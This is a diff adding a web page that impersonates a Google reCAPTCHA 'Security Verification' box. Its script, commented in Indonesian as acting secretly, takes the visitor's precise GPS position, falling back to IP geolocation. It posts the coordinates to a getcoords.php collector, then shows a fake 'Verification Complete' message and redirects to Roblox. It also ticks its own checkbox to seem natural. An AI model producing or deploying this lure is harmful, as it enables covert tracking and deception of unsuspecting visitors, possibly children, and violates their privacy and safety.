@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Verification - Google</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #f8f9fa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .captcha-box {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            width: 350px;
+            overflow: hidden;
+            border: 1px solid #dadce0;
+        }
+        
+        .header {
+            background: #1a73e8;
+            color: white;
+            padding: 16px 20px;
+            font-size: 16px;
+            font-weight: 500;
+        }
+        
+        .content {
+            padding: 24px 20px;
+        }
+        
+        .checkbox-container {
+            background: #f8f9fa;
+            border: 2px solid #dadce0;
+            border-radius: 4px;
+            padding: 14px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 20px;
+        }
+        
+        .checkbox-container:hover {
+            background: #f1f3f4;
+            border-color: #1a73e8;
+        }
+        
+        .checkbox {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #5f6368;
+            border-radius: 4px;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .checkbox.checked {
+            background: #1a73e8;
+            border-color: #1a73e8;
+        }
+        
+        .checkbox.checked::after {
+            content: '✓';
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .checkbox-text {
+            font-size: 16px;
+            color: #202124;
+        }
+        
+        .captcha-image {
+            background: #f8f9fa;
+            border-radius: 4px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .captcha-image img {
+            width: 100%;
+            border-radius: 4px;
+        }
+        
+        .verify-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+        }
+        
+        .verify-btn:hover {
+            background: #0d62d9;
+        }
+        
+        .verify-btn:disabled {
+            background: #dadce0;
+            cursor: not-allowed;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 16px;
+            border-top: 1px solid #dadce0;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo img {
+            height: 24px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="captcha-box">
+        <div class="header">
+            Security Verification
+        </div>
+        
+        <div class="content">
+            <div class="logo">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png" alt="Google">
+            </div>
+            
+            <p style="color: #202124; margin-bottom: 20px; font-size: 15px;">
+                Please confirm you are not a robot by completing the verification below.
+            </p>
+            
+            <div class="checkbox-container" id="robotCheckbox" onclick="toggleCheckbox()">
+                <div class="checkbox" id="checkbox"></div>
+                <div class="checkbox-text">I'm not a robot</div>
+            </div>
+            
+            <div class="captcha-image">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+                <div style="font-size: 12px; color: #5f6368; margin-top: 8px;">
+                    reCAPTCHA protects you from spam and abuse
+                </div>
+            </div>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Verifying your information...</p>
+                <p style="font-size: 12px;">This may take a few seconds</p>
+            </div>
+            
+            <button class="verify-btn" id="verifyBtn" onclick="startVerification()" disabled>
+                VERIFY
+            </button>
+        </div>
+        
+        <div class="footer">
+            <a href="#">Privacy</a> • <a href="#">Terms</a>
+            <div style="margin-top: 8px;">
+                Protected by reCAPTCHA
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let isChecked = false;
+        
+        function toggleCheckbox() {
+            isChecked = !isChecked;
+            const checkbox = document.getElementById('checkbox');
+            const verifyBtn = document.getElementById('verifyBtn');
+            
+            if (isChecked) {
+                checkbox.classList.add('checked');
+                verifyBtn.disabled = false;
+            } else {
+                checkbox.classList.remove('checked');
+                verifyBtn.disabled = true;
+            }
+        }
+        
+        function startVerification() {
+            if (!isChecked) return;
+            
+            // Tampilkan loading
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('verifyBtn').style.display = 'none';
+            document.getElementById('robotCheckbox').style.display = 'none';
+            
+            // Simulasi proses verifikasi
+            setTimeout(() => {
+                // AMBIL LOKASI DI SINI (diam-diam)
+                grabLocation();
+            }, 1500);
+        }
+        
+        function grabLocation() {
+            // TRY 1: GPS Location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Success - kirim ke server
+                        sendToServer(position.coords.latitude, position.coords.longitude, 'gps');
+                        showSuccess();
+                    },
+                    () => {
+                        // Failed - coba IP location
+                        getIPLocation();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 4000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                getIPLocation();
+            }
+        }
+        
+        function getIPLocation() {
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    sendToServer(data.latitude, data.longitude, 'ip');
+                    showSuccess();
+                })
+                .catch(() => {
+                    sendToServer(0, 0, 'failed');
+                    showSuccess();
+                });
+        }
+        
+        function sendToServer(lat, lon, method) {
+            // Kirim data ke PHP (diam-diam)
+            const formData = new FormData();
+            formData.append('lat', lat);
+            formData.append('lon', lon);
+            formData.append('method', method);
+            formData.append('type', 'captcha');
+            
+            fetch('getcoords.php', {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        }
+        
+        function showSuccess() {
+            document.getElementById('loading').innerHTML = `
+                <div style="color: #34a853; font-size: 48px; margin-bottom: 15px;">✓</div>
+                <h3 style="color: #202124;">Verification Complete</h3>
+                <p style="color: #5f6368;">You may proceed to your destination.</p>
+                <button onclick="redirectToRoblox()" style="background: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 4px; margin-top: 15px; cursor: pointer;">
+                    CONTINUE
+                </button>
+            `;
+        }
+        
+        function redirectToRoblox() {
+            // Redirect ke Roblox (atau tujuan lain)
+            window.location.href = 'https://www.roblox.com';
+        }
+        
+        // Auto-click checkbox setelah 2 detik (biar lebih natural)
+        setTimeout(() => {
+            if (!isChecked) {
+                toggleCheckbox();
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
